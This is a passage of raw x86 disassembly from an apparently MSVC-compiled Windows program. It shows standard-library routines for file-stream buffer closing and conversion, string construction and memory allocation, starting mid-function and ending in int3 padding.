  4041cd:	ff 76 4c             	push   0x4c(%esi)
  4041d0:	50                   	push   %eax
  4041d1:	ff 15 d4 91 40 00    	call   *0x4091d4
  4041d7:	83 c4 08             	add    $0x8,%esp
  4041da:	83 c9 ff             	or     $0xffffffff,%ecx
  4041dd:	3b c1                	cmp    %ecx,%eax
  4041df:	0f 45 cb             	cmovne %ebx,%ecx
  4041e2:	5f                   	pop    %edi
  4041e3:	5e                   	pop    %esi
  4041e4:	8b c1                	mov    %ecx,%eax
  4041e6:	5b                   	pop    %ebx
  4041e7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4041ea:	33 cd                	xor    %ebp,%ecx
  4041ec:	e8 88 28 00 00       	call   0x406a79
  4041f1:	8b e5                	mov    %ebp,%esp
  4041f3:	5d                   	pop    %ebp
  4041f4:	c2 04 00             	ret    $0x4
  4041f7:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  4041fa:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4041fd:	2b f8                	sub    %eax,%edi
  4041ff:	74 14                	je     0x404215
  404201:	ff 76 4c             	push   0x4c(%esi)
  404204:	57                   	push   %edi
  404205:	6a 01                	push   $0x1
  404207:	50                   	push   %eax
  404208:	ff 15 f8 91 40 00    	call   *0x4091f8
  40420e:	83 c4 10             	add    $0x10,%esp
  404211:	3b f8                	cmp    %eax,%edi
  404213:	75 23                	jne    0x404238
  404215:	8d 4d db             	lea    -0x25(%ebp),%ecx
  404218:	c6 46 3d 01          	movb   $0x1,0x3d(%esi)
  40421c:	83 c8 ff             	or     $0xffffffff,%eax
  40421f:	39 4d d0             	cmp    %ecx,-0x30(%ebp)
  404222:	5f                   	pop    %edi
  404223:	5e                   	pop    %esi
  404224:	0f 45 c3             	cmovne %ebx,%eax
  404227:	5b                   	pop    %ebx
  404228:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40422b:	33 cd                	xor    %ebp,%ecx
  40422d:	e8 47 28 00 00       	call   0x406a79
  404232:	8b e5                	mov    %ebp,%esp
  404234:	5d                   	pop    %ebp
  404235:	c2 04 00             	ret    $0x4
  404238:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40423b:	83 c8 ff             	or     $0xffffffff,%eax
  40423e:	5f                   	pop    %edi
  40423f:	5e                   	pop    %esi
  404240:	33 cd                	xor    %ebp,%ecx
  404242:	5b                   	pop    %ebx
  404243:	e8 31 28 00 00       	call   0x406a79
  404248:	8b e5                	mov    %ebp,%esp
  40424a:	5d                   	pop    %ebp
  40424b:	c2 04 00             	ret    $0x4
  40424e:	cc                   	int3
  40424f:	cc                   	int3
  404250:	8b 41 4c             	mov    0x4c(%ecx),%eax
  404253:	85 c0                	test   %eax,%eax
  404255:	74 08                	je     0x40425f
  404257:	50                   	push   %eax
  404258:	ff 15 50 91 40 00    	call   *0x409150
  40425e:	59                   	pop    %ecx
  40425f:	c3                   	ret
  404260:	8b 41 4c             	mov    0x4c(%ecx),%eax
  404263:	85 c0                	test   %eax,%eax
  404265:	74 08                	je     0x40426f
  404267:	50                   	push   %eax
  404268:	ff 15 4c 91 40 00    	call   *0x40914c
  40426e:	59                   	pop    %ecx
  40426f:	c3                   	ret
  404270:	55                   	push   %ebp
  404271:	8b ec                	mov    %esp,%ebp
  404273:	6a ff                	push   $0xffffffff
  404275:	68 00 7e 40 00       	push   $0x407e00
  40427a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404280:	50                   	push   %eax
  404281:	56                   	push   %esi
  404282:	57                   	push   %edi
  404283:	a1 04 c0 40 00       	mov    0x40c004,%eax
  404288:	33 c5                	xor    %ebp,%eax
  40428a:	50                   	push   %eax
  40428b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40428e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404294:	8b f1                	mov    %ecx,%esi
  404296:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
  40429a:	c7 06 44 95 40 00    	movl   $0x409544,(%esi)
  4042a0:	74 1e                	je     0x4042c0
  4042a2:	8b 7e 0c             	mov    0xc(%esi),%edi
  4042a5:	8d 46 3c             	lea    0x3c(%esi),%eax
  4042a8:	39 07                	cmp    %eax,(%edi)
  4042aa:	75 14                	jne    0x4042c0
  4042ac:	8b 56 54             	mov    0x54(%esi),%edx
  4042af:	8b 4e 50             	mov    0x50(%esi),%ecx
  4042b2:	2b d1                	sub    %ecx,%edx
  4042b4:	89 0f                	mov    %ecx,(%edi)
  4042b6:	8b 46 1c             	mov    0x1c(%esi),%eax
  4042b9:	89 08                	mov    %ecx,(%eax)
  4042bb:	8b 46 2c             	mov    0x2c(%esi),%eax
  4042be:	89 10                	mov    %edx,(%eax)
  4042c0:	80 7e 48 00          	cmpb   $0x0,0x48(%esi)
  4042c4:	74 48                	je     0x40430e
  4042c6:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
  4042ca:	74 13                	je     0x4042df
  4042cc:	8b ce                	mov    %esi,%ecx
  4042ce:	e8 fd 02 00 00       	call   0x4045d0
  4042d3:	ff 76 4c             	push   0x4c(%esi)
  4042d6:	ff 15 00 92 40 00    	call   *0x409200
  4042dc:	83 c4 04             	add    $0x4,%esp
  4042df:	8b ce                	mov    %esi,%ecx
  4042e1:	c6 46 48 00          	movb   $0x0,0x48(%esi)
  4042e5:	c6 46 3d 00          	movb   $0x0,0x3d(%esi)
  4042e9:	ff 15 b8 90 40 00    	call   *0x4090b8
  4042ef:	a1 90 c7 40 00       	mov    0x40c790,%eax
  4042f4:	8b 15 94 c7 40 00    	mov    0x40c794,%edx
  4042fa:	c7 46 4c 00 00 00 00 	movl   $0x0,0x4c(%esi)
  404301:	89 46 40             	mov    %eax,0x40(%esi)
  404304:	89 56 44             	mov    %edx,0x44(%esi)
  404307:	c7 46 38 00 00 00 00 	movl   $0x0,0x38(%esi)
  40430e:	8b ce                	mov    %esi,%ecx
  404310:	ff 15 68 90 40 00    	call   *0x409068
  404316:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404319:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404320:	59                   	pop    %ecx
  404321:	5f                   	pop    %edi
  404322:	5e                   	pop    %esi
  404323:	8b e5                	mov    %ebp,%esp
  404325:	5d                   	pop    %ebp
  404326:	c3                   	ret
  404327:	cc                   	int3
  404328:	cc                   	int3
  404329:	cc                   	int3
  40432a:	cc                   	int3
  40432b:	cc                   	int3
  40432c:	cc                   	int3
  40432d:	cc                   	int3
  40432e:	cc                   	int3
  40432f:	cc                   	int3
  404330:	56                   	push   %esi
  404331:	8b f1                	mov    %ecx,%esi
  404333:	8b 4e 14             	mov    0x14(%esi),%ecx
  404336:	83 f9 10             	cmp    $0x10,%ecx
  404339:	72 27                	jb     0x404362
  40433b:	8b 06                	mov    (%esi),%eax
  40433d:	41                   	inc    %ecx
  40433e:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404344:	72 12                	jb     0x404358
  404346:	8b 50 fc             	mov    -0x4(%eax),%edx
  404349:	83 c1 23             	add    $0x23,%ecx
  40434c:	2b c2                	sub    %edx,%eax
  40434e:	83 c0 fc             	add    $0xfffffffc,%eax
  404351:	83 f8 1f             	cmp    $0x1f,%eax
  404354:	77 1f                	ja     0x404375
  404356:	8b c2                	mov    %edx,%eax
  404358:	51                   	push   %ecx
  404359:	50                   	push   %eax
  40435a:	e8 5d 27 00 00       	call   0x406abc
  40435f:	83 c4 08             	add    $0x8,%esp
  404362:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  404369:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  404370:	c6 06 00             	movb   $0x0,(%esi)
  404373:	5e                   	pop    %esi
  404374:	c3                   	ret
  404375:	ff 15 80 91 40 00    	call   *0x409180
  40437b:	cc                   	int3
  40437c:	cc                   	int3
  40437d:	cc                   	int3
  40437e:	cc                   	int3
  40437f:	cc                   	int3
  404380:	55                   	push   %ebp
  404381:	8b ec                	mov    %esp,%ebp
  404383:	6a ff                	push   $0xffffffff
  404385:	68 20 7e 40 00       	push   $0x407e20
  40438a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404390:	50                   	push   %eax
  404391:	56                   	push   %esi
  404392:	57                   	push   %edi
  404393:	a1 04 c0 40 00       	mov    0x40c004,%eax
  404398:	33 c5                	xor    %ebp,%eax
  40439a:	50                   	push   %eax
  40439b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40439e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4043a4:	8b f1                	mov    %ecx,%esi
  4043a6:	8b 55 08             	mov    0x8(%ebp),%edx
  4043a9:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4043af:	8b ca                	mov    %edx,%ecx
  4043b1:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4043b8:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4043bf:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4043c6:	8d 79 01             	lea    0x1(%ecx),%edi
  4043c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  4043d0:	8a 01                	mov    (%ecx),%al
  4043d2:	41                   	inc    %ecx
  4043d3:	84 c0                	test   %al,%al
  4043d5:	75 f9                	jne    0x4043d0
  4043d7:	2b cf                	sub    %edi,%ecx
  4043d9:	51                   	push   %ecx
  4043da:	52                   	push   %edx
  4043db:	8b ce                	mov    %esi,%ecx
  4043dd:	e8 1e 04 00 00       	call   0x404800
  4043e2:	8b c6                	mov    %esi,%eax
  4043e4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4043e7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4043ee:	59                   	pop    %ecx
  4043ef:	5f                   	pop    %edi
  4043f0:	5e                   	pop    %esi
  4043f1:	8b e5                	mov    %ebp,%esp
  4043f3:	5d                   	pop    %ebp
  4043f4:	c2 04 00             	ret    $0x4
  4043f7:	cc                   	int3
  4043f8:	cc                   	int3
  4043f9:	cc                   	int3
  4043fa:	cc                   	int3
  4043fb:	cc                   	int3
  4043fc:	cc                   	int3
  4043fd:	cc                   	int3
  4043fe:	cc                   	int3
  4043ff:	cc                   	int3
  404400:	55                   	push   %ebp
  404401:	8b ec                	mov    %esp,%ebp
  404403:	51                   	push   %ecx
  404404:	53                   	push   %ebx
  404405:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404408:	56                   	push   %esi
  404409:	8b f1                	mov    %ecx,%esi
  40440b:	57                   	push   %edi
  40440c:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  404412:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  404419:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  404420:	83 7b 14 10          	cmpl   $0x10,0x14(%ebx)
  404424:	8b 43 10             	mov    0x10(%ebx),%eax
  404427:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40442a:	72 02                	jb     0x40442e
  40442c:	8b 1b                	mov    (%ebx),%ebx
  40442e:	83 f8 10             	cmp    $0x10,%eax
  404431:	73 1c                	jae    0x40444f
  404433:	0f 10 03             	movups (%ebx),%xmm0
  404436:	bf 0f 00 00 00       	mov    $0xf,%edi
  40443b:	0f 11 06             	movups %xmm0,(%esi)
  40443e:	89 46 10             	mov    %eax,0x10(%esi)
  404441:	8b c6                	mov    %esi,%eax
  404443:	89 7e 14             	mov    %edi,0x14(%esi)
  404446:	5f                   	pop    %edi
  404447:	5e                   	pop    %esi
  404448:	5b                   	pop    %ebx
  404449:	8b e5                	mov    %ebp,%esp
  40444b:	5d                   	pop    %ebp
  40444c:	c2 04 00             	ret    $0x4
  40444f:	8b f8                	mov    %eax,%edi
  404451:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  404456:	83 cf 0f             	or     $0xf,%edi
  404459:	3b f8                	cmp    %eax,%edi
  40445b:	0f 47 f8             	cmova  %eax,%edi
  40445e:	8d 47 01             	lea    0x1(%edi),%eax
  404461:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404466:	72 25                	jb     0x40448d
  404468:	8d 48 23             	lea    0x23(%eax),%ecx
  40446b:	3b c8                	cmp    %eax,%ecx
  40446d:	76 56                	jbe    0x4044c5
  40446f:	51                   	push   %ecx
  404470:	e8 12 26 00 00       	call   0x406a87
  404475:	83 c4 04             	add    $0x4,%esp
  404478:	85 c0                	test   %eax,%eax
  40447a:	74 0b                	je     0x404487
  40447c:	8d 48 23             	lea    0x23(%eax),%ecx
  40447f:	83 e1 e0             	and    $0xffffffe0,%ecx
  404482:	89 41 fc             	mov    %eax,-0x4(%ecx)
  404485:	eb 19                	jmp    0x4044a0
  404487:	ff 15 80 91 40 00    	call   *0x409180
  40448d:	85 c0                	test   %eax,%eax
  40448f:	74 0d                	je     0x40449e
  404491:	50                   	push   %eax
  404492:	e8 f0 25 00 00       	call   0x406a87
  404497:	83 c4 04             	add    $0x4,%esp
  40449a:	8b c8                	mov    %eax,%ecx
  40449c:	eb 02                	jmp    0x4044a0
  40449e:	33 c9                	xor    %ecx,%ecx
  4044a0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044a3:	40                   	inc    %eax
  4044a4:	89 0e                	mov    %ecx,(%esi)
  4044a6:	50                   	push   %eax
  4044a7:	53                   	push   %ebx
  4044a8:	51                   	push   %ecx
  4044a9:	e8 13 35 00 00       	call   0x4079c1
  4044ae:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044b1:	83 c4 0c             	add    $0xc,%esp
  4044b4:	89 46 10             	mov    %eax,0x10(%esi)
  4044b7:	8b c6                	mov    %esi,%eax
  4044b9:	89 7e 14             	mov    %edi,0x14(%esi)
  4044bc:	5f                   	pop    %edi
  4044bd:	5e                   	pop    %esi
  4044be:	5b                   	pop    %ebx
  4044bf:	8b e5                	mov    %ebp,%esp
  4044c1:	5d                   	pop    %ebp
  4044c2:	c2 04 00             	ret    $0x4
  4044c5:	e8 06 cc ff ff       	call   0x4010d0
  4044ca:	cc                   	int3
  4044cb:	cc                   	int3
  4044cc:	cc                   	int3
  4044cd:	cc                   	int3
  4044ce:	cc                   	int3
  4044cf:	cc                   	int3
  4044d0:	55                   	push   %ebp
  4044d1:	8b ec                	mov    %esp,%ebp
  4044d3:	56                   	push   %esi
  4044d4:	8b f1                	mov    %ecx,%esi
  4044d6:	e8 95 fd ff ff       	call   0x404270
  4044db:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4044df:	74 0b                	je     0x4044ec
  4044e1:	6a 58                	push   $0x58
  4044e3:	56                   	push   %esi
  4044e4:	e8 d3 25 00 00       	call   0x406abc
  4044e9:	83 c4 08             	add    $0x8,%esp
  4044ec:	8b c6                	mov    %esi,%eax
  4044ee:	5e                   	pop    %esi
  4044ef:	5d                   	pop    %ebp
  4044f0:	c2 04 00             	ret    $0x4
  4044f3:	cc                   	int3
  4044f4:	cc                   	int3
  4044f5:	cc                   	int3
  4044f6:	cc                   	int3
  4044f7:	cc                   	int3
  4044f8:	cc                   	int3
  4044f9:	cc                   	int3
  4044fa:	cc                   	int3
  4044fb:	cc                   	int3
  4044fc:	cc                   	int3
  4044fd:	cc                   	int3
  4044fe:	cc                   	int3
  4044ff:	cc                   	int3
  404500:	55                   	push   %ebp
  404501:	8b ec                	mov    %esp,%ebp
  404503:	56                   	push   %esi
  404504:	8b f1                	mov    %ecx,%esi
  404506:	8b 46 88             	mov    -0x78(%esi),%eax
  404509:	57                   	push   %edi
  40450a:	8d 7e 88             	lea    -0x78(%esi),%edi
  40450d:	8b 40 04             	mov    0x4(%eax),%eax
  404510:	c7 44 30 88 b8 95 40 	movl   $0x4095b8,-0x78(%eax,%esi,1)
  404517:	00 
  404518:	8b 07                	mov    (%edi),%eax
  40451a:	8b 48 04             	mov    0x4(%eax),%ecx
  40451d:	8d 41 88             	lea    -0x78(%ecx),%eax
  404520:	89 44 31 84          	mov    %eax,-0x7c(%ecx,%esi,1)
  404524:	8d 4e a0             	lea    -0x60(%esi),%ecx
  404527:	e8 44 fd ff ff       	call   0x404270
  40452c:	8d 4e a8             	lea    -0x58(%esi),%ecx
  40452f:	ff 15 14 91 40 00    	call   *0x409114
  404535:	8b ce                	mov    %esi,%ecx
  404537:	ff 15 78 90 40 00    	call   *0x409078
  40453d:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  404541:	74 0e                	je     0x404551
  404543:	68 c0 00 00 00       	push   $0xc0
  404548:	57                   	push   %edi
  404549:	e8 6e 25 00 00       	call   0x406abc
  40454e:	83 c4 08             	add    $0x8,%esp
  404551:	8b c7                	mov    %edi,%eax
  404553:	5f                   	pop    %edi
  404554:	5e                   	pop    %esi
  404555:	5d                   	pop    %ebp
  404556:	c2 04 00             	ret    $0x4
  404559:	cc                   	int3
  40455a:	cc                   	int3
  40455b:	cc                   	int3
  40455c:	cc                   	int3
  40455d:	cc                   	int3
  40455e:	cc                   	int3
  40455f:	cc                   	int3
  404560:	55                   	push   %ebp
  404561:	8b ec                	mov    %esp,%ebp
  404563:	6a ff                	push   $0xffffffff
  404565:	68 40 7e 40 00       	push   $0x407e40
  40456a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404570:	50                   	push   %eax
  404571:	56                   	push   %esi
  404572:	a1 04 c0 40 00       	mov    0x40c004,%eax
  404577:	33 c5                	xor    %ebp,%eax
  404579:	50                   	push   %eax
  40457a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40457d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404583:	8b f1                	mov    %ecx,%esi
  404585:	ff 15 04 91 40 00    	call   *0x409104
  40458b:	85 c0                	test   %eax,%eax
  40458d:	75 08                	jne    0x404597
  40458f:	8b 0e                	mov    (%esi),%ecx
  404591:	ff 15 b4 90 40 00    	call   *0x4090b4
  404597:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40459e:	8b 0e                	mov    (%esi),%ecx
  4045a0:	8b 01                	mov    (%ecx),%eax
  4045a2:	8b 40 04             	mov    0x4(%eax),%eax
  4045a5:	8b 4c 08 38          	mov    0x38(%eax,%ecx,1),%ecx
  4045a9:	85 c9                	test   %ecx,%ecx
  4045ab:	74 05                	je     0x4045b2
  4045ad:	8b 01                	mov    (%ecx),%eax
  4045af:	ff 50 08             	call   *0x8(%eax)
  4045b2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4045b5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4045bc:	59                   	pop    %ecx
  4045bd:	5e                   	pop    %esi
  4045be:	8b e5                	mov    %ebp,%esp
  4045c0:	5d                   	pop    %ebp
  4045c1:	c3                   	ret
  4045c2:	cc                   	int3
  4045c3:	cc                   	int3
  4045c4:	cc                   	int3
  4045c5:	cc                   	int3
  4045c6:	cc                   	int3
  4045c7:	cc                   	int3
  4045c8:	cc                   	int3
  4045c9:	cc                   	int3
  4045ca:	cc                   	int3
  4045cb:	cc                   	int3
  4045cc:	cc                   	int3
  4045cd:	cc                   	int3
  4045ce:	cc                   	int3
  4045cf:	cc                   	int3
  4045d0:	55                   	push   %ebp
  4045d1:	8b ec                	mov    %esp,%ebp
  4045d3:	83 ec 28             	sub    $0x28,%esp
  4045d6:	a1 04 c0 40 00       	mov    0x40c004,%eax
  4045db:	33 c5                	xor    %ebp,%eax
  4045dd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4045e0:	56                   	push   %esi
  4045e1:	8b f1                	mov    %ecx,%esi
  4045e3:	83 7e 38 00          	cmpl   $0x0,0x38(%esi)
  4045e7:	0f 84 9f 00 00 00    	je     0x40468c
  4045ed:	80 7e 3d 00          	cmpb   $0x0,0x3d(%esi)
  4045f1:	0f 84 95 00 00 00    	je     0x40468c
  4045f7:	8b 06                	mov    (%esi),%eax
  4045f9:	57                   	push   %edi
  4045fa:	6a ff                	push   $0xffffffff
  4045fc:	ff 50 0c             	call   *0xc(%eax)
  4045ff:	83 f8 ff             	cmp    $0xffffffff,%eax
  404602:	74 76                	je     0x40467a
  404604:	8b 4e 38             	mov    0x38(%esi),%ecx
  404607:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40460a:	50                   	push   %eax
  40460b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40460e:	50                   	push   %eax
  40460f:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404612:	50                   	push   %eax
  404613:	8d 46 40             	lea    0x40(%esi),%eax
  404616:	50                   	push   %eax
  404617:	ff 15 bc 90 40 00    	call   *0x4090bc
  40461d:	83 e8 00             	sub    $0x0,%eax
  404620:	74 1f                	je     0x404641
  404622:	83 e8 01             	sub    $0x1,%eax
  404625:	74 1e                	je     0x404645
  404627:	83 e8 02             	sub    $0x2,%eax
  40462a:	75 4e                	jne    0x40467a
  40462c:	88 46 3d             	mov    %al,0x3d(%esi)
  40462f:	b0 01                	mov    $0x1,%al
  404631:	5f                   	pop    %edi
  404632:	5e                   	pop    %esi
  404633:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404636:	33 cd                	xor    %ebp,%ecx
  404638:	e8 3c 24 00 00       	call   0x406a79
  40463d:	8b e5                	mov    %ebp,%esp
  40463f:	5d                   	pop    %ebp
  404640:	c3                   	ret
  404641:	c6 46 3d 00          	movb   $0x0,0x3d(%esi)
  404645:	8b 7d d8             	mov    -0x28(%ebp),%edi
  404648:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40464b:	2b f8                	sub    %eax,%edi
  40464d:	74 14                	je     0x404663
  40464f:	ff 76 4c             	push   0x4c(%esi)
  404652:	57                   	push   %edi
  404653:	6a 01                	push   $0x1
  404655:	50                   	push   %eax
  404656:	ff 15 f8 91 40 00    	call   *0x4091f8
  40465c:	83 c4 10             	add    $0x10,%esp
  40465f:	3b f8                	cmp    %eax,%edi
  404661:	75 17                	jne    0x40467a
  404663:	80 7e 3d 00          	cmpb   $0x0,0x3d(%esi)
  404667:	5f                   	pop    %edi
  404668:	0f 94 c0             	sete   %al
  40466b:	5e                   	pop    %esi
  40466c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40466f:	33 cd                	xor    %ebp,%ecx
  404671:	e8 03 24 00 00       	call   0x406a79
  404676:	8b e5                	mov    %ebp,%esp
  404678:	5d                   	pop    %ebp
  404679:	c3                   	ret
  40467a:	5f                   	pop    %edi
  40467b:	32 c0                	xor    %al,%al
  40467d:	5e                   	pop    %esi
  40467e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404681:	33 cd                	xor    %ebp,%ecx
  404683:	e8 f1 23 00 00       	call   0x406a79
  404688:	8b e5                	mov    %ebp,%esp
  40468a:	5d                   	pop    %ebp
  40468b:	c3                   	ret
  40468c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40468f:	b0 01                	mov    $0x1,%al
  404691:	33 cd                	xor    %ebp,%ecx
  404693:	5e                   	pop    %esi
  404694:	e8 e0 23 00 00       	call   0x406a79
  404699:	8b e5                	mov    %ebp,%esp
  40469b:	5d                   	pop    %ebp
  40469c:	c3                   	ret
  40469d:	cc                   	int3
  40469e:	cc                   	int3
  40469f:	cc                   	int3
  4046a0:	55                   	push   %ebp
  4046a1:	8b ec                	mov    %esp,%ebp
  4046a3:	83 ec 0c             	sub    $0xc,%esp
  4046a6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4046a9:	8b 55 08             	mov    0x8(%ebp),%edx
  4046ac:	53                   	push   %ebx
  4046ad:	56                   	push   %esi
  4046ae:	57                   	push   %edi
  4046af:	8b f9                	mov    %ecx,%edi
  4046b1:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4046b4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4046b7:	8b 4f 14             	mov    0x14(%edi),%ecx
  4046ba:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4046bd:	3b c1                	cmp    %ecx,%eax
  4046bf:	77 2b                	ja     0x4046ec
  4046c1:	8b df                	mov    %edi,%ebx
  4046c3:	83 f9 08             	cmp    $0x8,%ecx
  4046c6:	72 02                	jb     0x4046ca
  4046c8:	8b 1f                	mov    (%edi),%ebx
  4046ca:	8d 34 00             	lea    (%eax,%eax,1),%esi
  4046cd:	89 47 10             	mov    %eax,0x10(%edi)
  4046d0:	56                   	push   %esi
  4046d1:	52                   	push   %edx
  4046d2:	53                   	push   %ebx
  4046d3:	e8 ef 32 00 00       	call   0x4079c7
  4046d8:	83 c4 0c             	add    $0xc,%esp
  4046db:	33 c0                	xor    %eax,%eax
  4046dd:	66 89 04 1e          	mov    %ax,(%esi,%ebx,1)
  4046e1:	8b c7                	mov    %edi,%eax
  4046e3:	5f                   	pop    %edi
  4046e4:	5e                   	pop    %esi
  4046e5:	5b                   	pop    %ebx
  4046e6:	8b e5                	mov    %ebp,%esp
  4046e8:	5d                   	pop    %ebp
  4046e9:	c2 08 00             	ret    $0x8
  4046ec:	3d fe ff ff 7f       	cmp    $0x7ffffffe,%eax
  4046f1:	0f 87 f8 00 00 00    	ja     0x4047ef
  4046f7:	8b f0                	mov    %eax,%esi
  4046f9:	83 ce 07             	or     $0x7,%esi
  4046fc:	81 fe fe ff ff 7f    	cmp    $0x7ffffffe,%esi
  404702:	76 07                	jbe    0x40470b
  404704:	be fe ff ff 7f       	mov    $0x7ffffffe,%esi
  404709:	eb 1e                	jmp    0x404729
  40470b:	8b d1                	mov    %ecx,%edx
  40470d:	b8 fe ff ff 7f       	mov    $0x7ffffffe,%eax
  404712:	d1 ea                	shr    $1,%edx
  404714:	2b c2                	sub    %edx,%eax
  404716:	3b c8                	cmp    %eax,%ecx
  404718:	76 07                	jbe    0x404721
  40471a:	be fe ff ff 7f       	mov    $0x7ffffffe,%esi
  40471f:	eb 08                	jmp    0x404729
  404721:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  404724:	3b f0                	cmp    %eax,%esi
  404726:	0f 42 f0             	cmovb  %eax,%esi
  404729:	33 c9                	xor    %ecx,%ecx
  40472b:	8b c6                	mov    %esi,%eax
  40472d:	83 c0 01             	add    $0x1,%eax
  404730:	0f 92 c1             	setb   %cl
  404733:	f7 d9                	neg    %ecx
  404735:	0b c8                	or     %eax,%ecx
  404737:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  40473d:	0f 87 a7 00 00 00    	ja     0x4047ea
  404743:	03 c9                	add    %ecx,%ecx
  404745:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40474b:	72 23                	jb     0x404770
  40474d:	8d 41 23             	lea    0x23(%ecx),%eax
  404750:	3b c1                	cmp    %ecx,%eax
  404752:	0f 86 92 00 00 00    	jbe    0x4047ea
  404758:	50                   	push   %eax
  404759:	e8 29 23 00 00       	call   0x406a87
  40475e:	83 c4 04             	add    $0x4,%esp
  404761:	85 c0                	test   %eax,%eax
  404763:	74 7f                	je     0x4047e4
  404765:	8d 58 23             	lea    0x23(%eax),%ebx
  404768:	83 e3 e0             	and    $0xffffffe0,%ebx
  40476b:	89 43 fc             	mov    %eax,-0x4(%ebx)
  40476e:	eb 13                	jmp    0x404783
  404770:	85 c9                	test   %ecx,%ecx
  404772:	74 0d                	je     0x404781
  404774:	51                   	push   %ecx
  404775:	e8 0d 23 00 00       	call   0x406a87
  40477a:	83 c4 04             	add    $0x4,%esp
  40477d:	8b d8                	mov    %eax,%ebx
  40477f:	eb 02                	jmp    0x404783
  404781:	33 db                	xor    %ebx,%ebx
  404783:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404786:	89 77 14             	mov    %esi,0x14(%edi)
  404789:	89 47 10             	mov    %eax,0x10(%edi)
  40478c:	8d 34 00             	lea    (%eax,%eax,1),%esi
  40478f:	56                   	push   %esi
  404790:	ff 75 f8             	push   -0x8(%ebp)
  404793:	53                   	push   %ebx
  404794:	e8 28 32 00 00       	call   0x4079c1
  404799:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40479c:	33 c0                	xor    %eax,%eax
  40479e:	83 c4 0c             	add    $0xc,%esp
  4047a1:	66 89 04 1e          	mov    %ax,(%esi,%ebx,1)
  4047a5:	83 f9 08             	cmp    $0x8,%ecx
  4047a8:	72 2d                	jb     0x4047d7
  4047aa:	8b 07                	mov    (%edi),%eax
  4047ac:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  4047b3:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4047b9:	72 12                	jb     0x4047cd
  4047bb:	8b 50 fc             	mov    -0x4(%eax),%edx
  4047be:	83 c1 23             	add    $0x23,%ecx
  4047c1:	2b c2                	sub    %edx,%eax
  4047c3:	83 c0 fc             	add    $0xfffffffc,%eax
  4047c6:	83 f8 1f             	cmp    $0x1f,%eax
  4047c9:	77 19                	ja     0x4047e4
  4047cb:	8b c2                	mov    %edx,%eax
  4047cd:	51                   	push   %ecx
  4047ce:	50                   	push   %eax
  4047cf:	e8 e8 22 00 00       	call   0x406abc
  4047d4:	83 c4 08             	add    $0x8,%esp
  4047d7:	89 1f                	mov    %ebx,(%edi)
  4047d9:	8b c7                	mov    %edi,%eax
  4047db:	5f                   	pop    %edi
  4047dc:	5e                   	pop    %esi
  4047dd:	5b                   	pop    %ebx
  4047de:	8b e5                	mov    %ebp,%esp
  4047e0:	5d                   	pop    %ebp
  4047e1:	c2 08 00             	ret    $0x8
  4047e4:	ff 15 80 91 40 00    	call   *0x409180
  4047ea:	e8 e1 c8 ff ff       	call   0x4010d0
  4047ef:	e8 7c c9 ff ff       	call   0x401170
  4047f4:	cc                   	int3
  4047f5:	cc                   	int3
  4047f6:	cc                   	int3
  4047f7:	cc                   	int3
  4047f8:	cc                   	int3
  4047f9:	cc                   	int3
  4047fa:	cc                   	int3
  4047fb:	cc                   	int3
